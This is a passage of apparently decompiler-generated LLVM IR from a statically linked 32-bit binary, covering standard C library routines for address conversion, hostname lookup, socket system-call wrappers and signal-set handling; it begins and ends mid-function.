  %v0_8052d0d = phi i32 [ %v1_8052d01, %dec_label_pc_8052ce4 ], [ %v0_8052d0d.pre, %dec_label_pc_8052d06 ]
  %v0_8052d09 = load i32, i32* @ebx, align 4
  %v2_8052d09 = udiv i32 %v0_8052d09, 256
  store i32 %v2_8052d09, i32* @ebx, align 4
  %v0_8052d0c = load i32, i32* @edi, align 4
  %v1_8052d0c = add i32 %v0_8052d0c, 1
  store i32 %v1_8052d0c, i32* @edi, align 4
  store i32 %v0_8052d0d, i32* @esi, align 4
  %v7_8052d12 = icmp sgt i32 %v1_8052d0c, 3
  br i1 %v7_8052d12, label %dec_label_pc_8052d14, label %dec_label_pc_8052ce4

dec_label_pc_8052d14:                             ; preds = %dec_label_pc_8052d09
  %v1_8052d14 = add i32 %v0_8052d0d, 1
  %v2_8052d17 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d17, i32* @ebx, align 4
  store i32 %v0_8052ccd, i32* @esi, align 4
  store i32 %v0_8052ccc, i32* @edi, align 4
  ret i32 %v1_8052d14

; uselistorder directives
  uselistorder i32 %v0_8052d0d, { 0, 2, 1 }
  uselistorder i32 %v1_8052ce0, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052d09, { 1, 0 }
  uselistorder label %dec_label_pc_8052ce4, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8052d27 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8065904.950 to i32))
  ret i32 %v2_8052d27
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052d33 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8052d3c = inttoptr i32 %arg1 to i8*
  %v3_8052d3c = call i32 @inet_aton(i8* %v2_8052d3c, i32 %v2_8052d33)
  %v1_8052d47 = icmp eq i32 %v3_8052d3c, 0
  br i1 %v1_8052d47, label %dec_label_pc_8052d4f, label %dec_label_pc_8052d4b

dec_label_pc_8052d4b:                             ; preds = %entry
  %v3_8052d4b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052d4f

dec_label_pc_8052d4f:                             ; preds = %entry, %dec_label_pc_8052d4b
  %v0_8052d4f = phi i32 [ -1, %entry ], [ %v3_8052d4b, %dec_label_pc_8052d4b ]
  ret i32 %v0_8052d4f

; uselistorder directives
  uselistorder label %dec_label_pc_8052d4f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d5b = call i32 @__GI___h_errno_location()
  %v0_8052d60 = load i32, i32* @edx, align 4
  %v2_8052d63 = ptrtoint i32* %stack_var_-4 to i32
  %v9_8052d7b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_8065aec.952, i32 ptrtoint (i32* @global_var_8065920.951 to i32), i32 460, i32 %v2_8052d63, i32 %v0_8052d5b, i32 %v0_8052d60, i32 %v0_8052d60)
  %v3_8052d80 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8052d80
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_1()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8052d88 = load i32, i32* @ebp, align 4
  %v0_8052d89 = load i32, i32* @edi, align 4
  %v0_8052d8a = load i32, i32* @esi, align 4
  %v0_8052d8b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8052d9b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8052d9b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8052da6 = icmp eq i32 %arg1, 0
  br i1 %v4_8052da6, label %dec_label_pc_80530b2, label %dec_label_pc_8052db1

dec_label_pc_8052db1:                             ; preds = %entry
  %v1_8052db1 = call i32 @__errno_location(i32 %v0_8052d8b)
  store i32 %v1_8052db1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052db1, i32* @esi, align 4
  %v1_8052db8 = inttoptr i32 %v1_8052db1 to i32*
  %v2_8052db8 = load i32, i32* %v1_8052db8, align 4
  store i32 %v2_8052db8, i32* @edi, align 4
  store i32 0, i32* %v1_8052db8, align 4
  %v0_8052dc9 = load i32, i32* @ebx, align 4
  store i32 %v0_8052dc9, i32* %stack_var_-108, align 4
  %v7_8052dd5 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8052dc9, i32 %arg5, i32 %arg6, i32 %v1_8052db1)
  store i32 %v7_8052dd5, i32* %eax.global-to-local, align 4
  %v1_8052ddd = icmp eq i32 %v7_8052dd5, 0
  br i1 %v1_8052ddd, label %dec_label_pc_80530b2, label %dec_label_pc_8052de5

dec_label_pc_8052de5:                             ; preds = %dec_label_pc_8052db1
  store i32 %arg6, i32* @ecx, align 4
  %v1_8052de9 = inttoptr i32 %arg6 to i32*
  %v2_8052de9 = load i32, i32* %v1_8052de9, align 4
  store i32 %v2_8052de9, i32* %edx.global-to-local, align 4
  %v9_8052deb = icmp eq i32 %v2_8052de9, 1
  br i1 %v9_8052deb, label %dec_label_pc_8052e05, label %dec_label_pc_8052df0

dec_label_pc_8052df0:                             ; preds = %dec_label_pc_8052de5
  %v9_8052df0 = icmp eq i32 %v2_8052de9, 4
  br i1 %v9_8052df0, label %dec_label_pc_8052e05, label %dec_label_pc_8052df5

dec_label_pc_8052df5:                             ; preds = %dec_label_pc_8052df0
  %v1_8052df5 = add i32 %v2_8052de9, 1
  %v8_8052df5 = icmp eq i32 %v1_8052df5, 0
  store i32 %v1_8052df5, i32* %edx.global-to-local, align 4
  %v1_8052df6 = icmp eq i1 %v8_8052df5, false
  br i1 %v1_8052df6, label %dec_label_pc_80530b2, label %dec_label_pc_8052dfc

dec_label_pc_8052dfc:                             ; preds = %dec_label_pc_8052df5
  %v0_8052dfc = load i32, i32* @esi, align 4
  %v1_8052dfc = inttoptr i32 %v0_8052dfc to i32*
  %v2_8052dfc = load i32, i32* %v1_8052dfc, align 4
  %v11_8052dfc = icmp eq i32 %v2_8052dfc, 2
  %v1_8052dff = icmp eq i1 %v11_8052dfc, false
  br i1 %v1_8052dff, label %dec_label_pc_80530b2, label %dec_label_pc_8052e05

dec_label_pc_8052e05:                             ; preds = %dec_label_pc_8052dfc, %dec_label_pc_8052df0, %dec_label_pc_8052de5
  %v0_8052e05 = load i32, i32* @ebp, align 4
  store i32 %v0_8052e05, i32* %eax.global-to-local, align 4
  %v0_8052e07 = load i32, i32* @edi, align 4
  %v1_8052e07 = load i32, i32* @esi, align 4
  %v2_8052e07 = inttoptr i32 %v1_8052e07 to i32*
  store i32 %v0_8052e07, i32* %v2_8052e07, align 4
  %v0_8052e09 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e09 = sub i32 0, %v0_8052e09
  %v1_8052e0b = urem i32 %v1_8052e09, 4
  %v2_8052e0b = icmp eq i32 %v1_8052e0b, 0
  store i32 %v1_8052e0b, i32* %eax.global-to-local, align 4
  %v0_8052e20.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8052e0b, label %dec_label_pc_8052e1c, label %dec_label_pc_8052e10

dec_label_pc_8052e10:                             ; preds = %dec_label_pc_8052e05
  %v2_8052e10 = sub i32 %v0_8052e20.pre, %v1_8052e0b
  %v7_8052e10 = icmp ult i32 %v0_8052e20.pre, %v1_8052e0b
  br i1 %v7_8052e10, label %dec_label_pc_80530ad, label %dec_label_pc_8052e18

dec_label_pc_8052e18:                             ; preds = %dec_label_pc_8052e10
  %v0_8052e18 = load i32, i32* @ebp, align 4
  %v2_8052e18 = add i32 %v0_8052e18, %v1_8052e0b
  store i32 %v2_8052e18, i32* @ebp, align 4
  store i32 %v2_8052e10, i32* @ebx, align 4
  br label %dec_label_pc_8052e1c

dec_label_pc_8052e1c:                             ; preds = %dec_label_pc_8052e05, %dec_label_pc_8052e18
  %v0_8052e20 = phi i32 [ %v2_8052e10, %dec_label_pc_8052e18 ], [ %v0_8052e20.pre, %dec_label_pc_8052e05 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8052de9, align 4
  %tmp43 = icmp ult i32 %v0_8052e20, 4
  br i1 %tmp43, label %dec_label_pc_80530ad, label %dec_label_pc_8052e2f

dec_label_pc_8052e2f:                             ; preds = %dec_label_pc_8052e1c
  %v0_8052e2f = load i32, i32* @ebx, align 4
  %v1_8052e2f = add i32 %v0_8052e2f, -4
  store i32 %v1_8052e2f, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8052e2f, 8
  br i1 %tmp44, label %dec_label_pc_80530ad, label %dec_label_pc_8052e3b

dec_label_pc_8052e3b:                             ; preds = %dec_label_pc_8052e2f
  %v0_8052e3b = load i32, i32* @ebp, align 4
  %v1_8052e3b = add i32 %v0_8052e3b, 4
  store i32 %v1_8052e3b, i32* %edx.global-to-local, align 4
  %v1_8052e3e = add i32 %v0_8052e2f, -12
  store i32 %v1_8052e3e, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e3b, i32* %stack_var_-92, align 4
  %v3_8052e47 = inttoptr i32 %v1_8052e3b to i32*
  store i32 %v0_8052e3b, i32* %v3_8052e47, align 4
  %v0_8052e4a = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e4a = add i32 %v0_8052e4a, 4
  %v2_8052e4a = inttoptr i32 %v1_8052e4a to i32*
  store i32 0, i32* %v2_8052e4a, align 4
  %tmp45 = icmp ult i32 %v1_8052e3e, 32
  br i1 %tmp45, label %dec_label_pc_80530ad, label %dec_label_pc_8052e57

dec_label_pc_8052e57:                             ; preds = %dec_label_pc_8052e3b
  %v0_8052e57 = load i32, i32* @ebx, align 4
  %v1_8052e57 = add i32 %v0_8052e57, -44
  store i32 %v1_8052e57, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_8052e57, 256
  br i1 %tmp46, label %dec_label_pc_80530ad, label %dec_label_pc_8052e6a

dec_label_pc_8052e6a:                             ; preds = %dec_label_pc_8052e57
  %v0_8052e6a = load i32, i32* @ebp, align 4
  %v1_8052e6a = add i32 %v0_8052e6a, 12
  %v1_8052e6d = add i32 %v0_8052e6a, 44
  store i32 %v1_8052e6d, i32* @edi, align 4
  store i32 %v1_8052e6d, i32* %stack_var_-108, align 4
  %v3_8052e7e = inttoptr i32 %v1_8052e6d to i8*
  %v4_8052e7e = call i32 @strncpy(i8* %v3_8052e7e, i32 %arg1, i32 %v1_8052e57)
  %v0_8052e83 = load i32, i32* @edi, align 4
  %v1_8052e83 = load i32, i32* @ebp, align 4
  %v2_8052e83 = add i32 %v1_8052e83, 12
  %v3_8052e83 = inttoptr i32 %v2_8052e83 to i32*
  store i32 %v0_8052e83, i32* %v3_8052e83, align 4
  %v1_8052e8a = add i32 %v0_8052e6a, 16
  %v2_8052e8a = inttoptr i32 %v1_8052e8a to i32*
  store i32 0, i32* %v2_8052e8a, align 4
  %v2_8052e91 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052e91, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8052e93 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8052e98 = inttoptr i32 %arg1 to i8*
  %v3_8052e98 = call i32 @inet_aton(i8* %v2_8052e98, i32 %v0_8052e93)
  store i32 %v3_8052e98, i32* %eax.global-to-local, align 4
  %v1_8052ea0 = icmp eq i32 %v3_8052e98, 0
  br i1 %v1_8052ea0, label %dec_label_pc_8052edc, label %dec_label_pc_8052ea4

dec_label_pc_8052ea4:                             ; preds = %dec_label_pc_8052e6a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8052ea8 = load i32, i32* @edi, align 4
  store i32 %v0_8052ea8, i32* %arg2, align 4
  %v1_8052eaa = add i32 %tmp18, 8
  %v2_8052eaa = inttoptr i32 %v1_8052eaa to i32*
  store i32 2, i32* %v2_8052eaa, align 4
  %v0_8052eb1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052eb1 = add i32 %v0_8052eb1, 12
  %v2_8052eb1 = inttoptr i32 %v1_8052eb1 to i32*
  store i32 4, i32* %v2_8052eb1, align 4
  %v2_8052eb8 = load i32, i32* %stack_var_-92, align 4
  %v1_8052ebb = load i32, i32* %edx.global-to-local, align 4
  %v2_8052ebb = add i32 %v1_8052ebb, 16
  %v3_8052ebb = inttoptr i32 %v2_8052ebb to i32*
  store i32 %v2_8052eb8, i32* %v3_8052ebb, align 4
  %v1_8052ec2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052ec2 = add i32 %v1_8052ec2, 4
  %v3_8052ec2 = inttoptr i32 %v2_8052ec2 to i32*
  store i32 %v1_8052e6a, i32* %v3_8052ec2, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_8052ec9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052ec9, i32* %v1_8052d9b, align 4
  store i32 0, i32* %v1_8052de9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530b2

dec_label_pc_8052edc:                             ; preds = %dec_label_pc_8052e6a
  %v0_8052edc = call i32 @__open_nameservers()
  store i32 %v0_8052edc, i32* @eax, align 4
  %v2_8052eec = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8052eec, i32* @ebx, align 4
  store i32 %v2_8052eec, i32* %stack_var_-108, align 4
  %v2_8052ef1 = call i32 @__pthread_return_void(i32 %v2_8052eec, i32 134564427)
  store i32 %v2_8052ef1, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %stack_var_-108, align 4
  %v1_8052efd = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f888.953 to i32))
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* @ecx, align 4
  store i32 134564427, i32* @eax, align 4
  store i32 %v2_8052eec, i32* %stack_var_-108, align 4
  %v0_8052f07 = load i32, i32* @global_var_8065f74.954, align 4
  store i32 %v0_8052f07, i32* @esi, align 4
  %v2_8052f0d = call i32 @__pthread_return_void(i32 %v2_8052eec, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8052f28 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8052f2d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052f2d, i32* %eax.global-to-local, align 4
  store i32 %v2_8052f2d, i32* %stack_var_-108, align 4
  %v0_8052f37 = load i32, i32* @esi, align 4
  %v7_8052f3e = call i32 @__dns_lookup(i8* %v2_8052e98, i32 1, i32 %v0_8052f37, i32 ptrtoint (i32* @global_var_8065f68.955 to i32), i32 %v2_8052f2d, i32 %v2_8052f28)
  store i32 %v7_8052f3e, i32* %eax.global-to-local, align 4
  %v2_8052f46 = icmp slt i32 %v7_8052f3e, 0
  %v1_8052f48 = icmp eq i1 %v2_8052f46, false
  br i1 %v1_8052f48, label %dec_label_pc_8052f5e, label %dec_label_pc_8052f4a

dec_label_pc_8052f4a:                             ; preds = %dec_label_pc_8052edc
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8052de9, align 4
  br label %dec_label_pc_80530b2

dec_label_pc_8052f5e:                             ; preds = %dec_label_pc_8052edc
  %v4_8052f5e = trunc i64 %tmp11 to i32
  store i32 %v4_8052f5e, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052f71 = icmp ugt i32 %v1_8052e57, 256
  %v15_8052f71 = icmp eq i32 %v0_8052e57, 300
  %v2_8052f75 = or i1 %v15_8052f71, %v10_8052f71
  br i1 %v2_8052f75, label %dec_label_pc_8053010, label %dec_label_pc_8052f77

dec_label_pc_8052f77:                             ; preds = %dec_label_pc_8052f5e
  %v3_8052f7a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052f7a, i32* %stack_var_-108, align 4
  %v1_8052f7e = call i32 @free(i32 %v3_8052f7a)
  store i32 %v1_8052f7e, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f7a, i32* @edi, align 4
  %v3_8052f84 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052f84, i32* %stack_var_-108, align 4
  %v1_8052f88 = call i32 @free(i32 %v3_8052f84)
  store i32 -1, i32* %v1_8052de9, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053088

dec_label_pc_8053010:                             ; preds = %dec_label_pc_8052f5e
  %v3_8053015.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8053019.pre = load i32, i32* @edi, align 4
  store i32 %v0_8053019.pre, i32* %stack_var_-108, align 4
  %v3_805301a = inttoptr i32 %v0_8053019.pre to i8*
  %v4_805301a = call i32 @strncpy(i8* %v3_805301a, i32 %v3_8053015.pre, i32 %v1_8052e57)
  store i32 %v4_805301a, i32* %eax.global-to-local, align 4
  store i32 %v0_8053019.pre, i32* @ecx, align 4
  %v3_8053020 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053020, i32* %stack_var_-108, align 4
  %v1_8053024 = call i32 @free(i32 %v3_8053020)
  store i32 %v1_8053024, i32* %eax.global-to-local, align 4
  %v12_805302c = icmp eq i32 %tmp10, 1
  %v1_8053031 = icmp eq i1 %v12_805302c, false
  br i1 %v1_8053031, label %dec_label_pc_805308d, label %dec_label_pc_8053033

dec_label_pc_8053033:                             ; preds = %dec_label_pc_8053010
  %v0_8053033 = load i32, i32* @edx, align 4
  %v0_805303a = load i32, i32* @ebp, align 4
  store i32 %v0_805303a, i32* %stack_var_-108, align 4
  %v3_805303b = inttoptr i32 %tmp to i16*
  %v4_805303b = call i32 @memcpy(i16* %v3_805303b, i32 4, i32 %v0_8053033)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8053044 = load i32, i32* @edi, align 4
  store i32 %v0_8053044, i32* %arg2, align 4
  %v1_8053046 = add i32 %tmp18, 8
  %v2_8053046 = inttoptr i32 %v1_8053046 to i32*
  store i32 2, i32* %v2_8053046, align 4
  %v0_805304d = load i32, i32* %eax.global-to-local, align 4
  %v1_805304d = add i32 %v0_805304d, 12
  %v2_805304d = inttoptr i32 %v1_805304d to i32*
  store i32 4, i32* %v2_805304d, align 4
  %v3_8053054 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8053054, i32* %edx.global-to-local, align 4
  %v1_8053058 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053058 = add i32 %v1_8053058, 16
  %v3_8053058 = inttoptr i32 %v2_8053058 to i32*
  store i32 %v3_8053054, i32* %v3_8053058, align 4
  %v1_805305f = load i32, i32* %eax.global-to-local, align 4
  %v2_805305f = add i32 %v1_805305f, 4
  %v3_805305f = inttoptr i32 %v2_805305f to i32*
  store i32 %v1_8052e6a, i32* %v3_805305f, align 4
  %v2_8053062 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8053062, i32* %eax.global-to-local, align 4
  %v3_8053063 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053063, i32* %stack_var_-108, align 4
  %v1_8053067 = call i32 @free(i32 %v3_8053063)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8052d9b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_8052de9, align 4
  br label %dec_label_pc_8053088

dec_label_pc_8053088:                             ; preds = %dec_label_pc_805308d, %dec_label_pc_8052f77, %dec_label_pc_8053033
  br label %dec_label_pc_80530b2

dec_label_pc_805308d:                             ; preds = %dec_label_pc_8053010
  %v3_8053090 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053090, i32* %stack_var_-108, align 4
  %v1_8053094 = call i32 @free(i32 %v3_8053090)
  store i32 1, i32* %v1_8052de9, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053088

dec_label_pc_80530ad:                             ; preds = %dec_label_pc_8052e57, %dec_label_pc_8052e3b, %dec_label_pc_8052e2f, %dec_label_pc_8052e1c, %dec_label_pc_8052e10
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530b2

dec_label_pc_80530b2:                             ; preds = %dec_label_pc_8052dfc, %dec_label_pc_8052df5, %dec_label_pc_8052db1, %entry, %dec_label_pc_8053088, %dec_label_pc_8052f4a, %dec_label_pc_8052ea4, %dec_label_pc_80530ad
  store i32 %v0_8052d8b, i32* @ebx, align 4
  store i32 %v0_8052d8a, i32* @esi, align 4
  store i32 %v0_8052d89, i32* @edi, align 4
  store i32 %v0_8052d88, i32* @ebp, align 4
  %v0_80530b9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80530b9

; uselistorder directives
  uselistorder i32 %v2_8052eec, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8052e6d, { 1, 0, 2 }
  uselistorder i32 %v1_8052e6a, { 1, 0 }
  uselistorder i32 %v1_8052e57, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8052e20.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8052e0b, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8052de9, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8052de9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8052d9b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80530b2, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053088, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052e1c, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80530d7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80530de = call i32 @__socketcall(i32 3, i32 %v2_80530d7)
  ret i32 %v2_80530de

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053103 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805310a = call i32 @__socketcall(i32 6, i32 %v2_8053103)
  ret i32 %v2_805310a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805313f = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053146 = call i32 @__socketcall(i32 15, i32 %v2_805313f)
  ret i32 %v2_8053146

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053173 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805317a = call i32 @__socketcall(i32 10, i32 %v2_8053173)
  ret i32 %v2_805317a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_80531a7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80531ae = call i32 @__socketcall(i32 9, i32 %v2_80531a7)
  ret i32 %v2_80531ae

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80531eb = ptrtoint i32* %stack_var_-24 to i32
  %v2_80531f2 = call i32 @__socketcall(i32 11, i32 %v2_80531eb)
  ret i32 %v2_80531f2

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053227 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805322e = call i32 @__socketcall(i32 14, i32 %v2_8053227)
  ret i32 %v2_805322e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053253 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805325a = call i32 @__socketcall(i32 1, i32 %v2_8053253)
  ret i32 %v2_805325a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 6, 5, 0, 1, 4, 7, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805327c, label %dec_label_pc_805326f

dec_label_pc_805326f:                             ; preds = %entry
  %v1_805326f = add i32 %arg1, -64
  %v3_805326f = sub i32 63, %arg1
  %v4_805326f = and i32 %v3_805326f, %arg1
  %v5_805326f = icmp slt i32 %v4_805326f, 0
  %v6_805326f = icmp eq i32 %v1_805326f, 0
  %v7_805326f = icmp slt i32 %v1_805326f, 0
  %v3_8053272 = icmp eq i1 %v7_805326f, %v5_805326f
  %v4_8053272 = icmp eq i1 %v6_805326f, false
  %v5_8053272 = and i1 %v4_8053272, %v3_8053272
  br i1 %v5_8053272, label %dec_label_pc_805327c, label %dec_label_pc_8053274

dec_label_pc_8053274:                             ; preds = %dec_label_pc_805326f
  %v4_8053277 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805327c

dec_label_pc_805327c:                             ; preds = %dec_label_pc_805326f, %entry, %dec_label_pc_8053274
  %v1_805327c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053281 = inttoptr i32 %v1_805327c to i32*
  store i32 22, i32* %v1_8053281, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805326f, { 1, 0 }
  uselistorder i32 -64, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805327c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805329e = inttoptr i32 %arg1 to i8*
  %v4_805329e = call i32 @__GI_memset(i8* %v3_805329e, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80532ac = load i32, i32* @ebx, align 4
  %v15_80532ad = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80532c1 = icmp eq i32 %arg2, -1
  br i1 %v10_80532c1, label %dec_label_pc_80532cf, label %dec_label_pc_80532c6

dec_label_pc_80532c6:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80532cf, label %dec_label_pc_80532ca

dec_label_pc_80532ca:                             ; preds = %dec_label_pc_80532c6
  %v7_80532cd = icmp sgt i32 %arg1, 64
  br i1 %v7_80532cd, label %dec_label_pc_80532cf, label %dec_label_pc_80532dc

dec_label_pc_80532cf:                             ; preds = %dec_label_pc_80532ca, %dec_label_pc_80532c6, %entry
